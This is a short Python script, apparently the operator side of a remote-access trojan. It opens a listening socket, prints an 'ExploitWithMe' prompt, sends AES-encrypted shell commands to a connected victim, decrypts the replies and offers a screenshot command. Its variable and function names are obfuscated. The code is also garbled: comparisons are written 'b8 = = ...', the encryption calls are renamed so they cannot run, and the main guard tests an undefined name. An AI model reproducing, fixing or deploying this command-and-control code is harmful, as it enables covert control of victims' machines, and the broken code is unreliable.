import os
import socket
import sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import pyscreenshot as ImageGrab
a1 = 829
b1 = 'localhost'
b2 = b'82e672ae054aa4de6f042c888111686a'
def fonk1(s: bytes) -> bytes:
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
def fonk2(b3: bytes) -> bytes:
    b3 = fonk1(b3)
    b4 = get_random_bytes(AES.block_size)
    b5 = AES.new(b2, AES.MODE_CBC, b4)
    return b4 + b5.fonk2(b3)
def fonk3(ciphertext: bytes) -> bytes:
    b4 = ciphertext[:AES.block_size]
    b5 = AES.new(b2, AES.MODE_CBC, b4)
    b3 = b5.fonk3(ciphertext[AES.block_size:])
    return b3.rstrip(b'\0')
def fonk4():
    try:
        b6 = ImageGrab.grab()
        b6.show()
        b6 = ImageGrab.grab(bbox=(10, 10, 500, 500))
        b6.show()
        ImageGrab.grab_to_file('b6.png')
    except Exception as e:
        print(f"Error occurred while taking screenshot: {e}")
def fonk5():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((b1, a1))
        s.listen(10)
        print(f'Attacker Listening Server Started on Port {a1}...')
        conn, b7 = s.accept()
        with conn:
            while True:
                try:
                    b8 = input('ExploitWithMe >> ').strip()
                    if b8 = = 'grab_screen':
                        fonk4()
                        os.system("cat b6.png")
                    elif b8 = = 'terminate':
                        conn.send(fonk2(b8.encode()))
                        print("Terminating connection...")
                        break
                    elif b8:
                        conn.send(fonk2(b8.encode()))
                        b9 = conn.recv(4096)
                        print(fonk3(b9).decode())
                except Exception as e:
                    print(f"An error occurred: {e}")
                    break
if b10 = = '__main__':
    fonk5()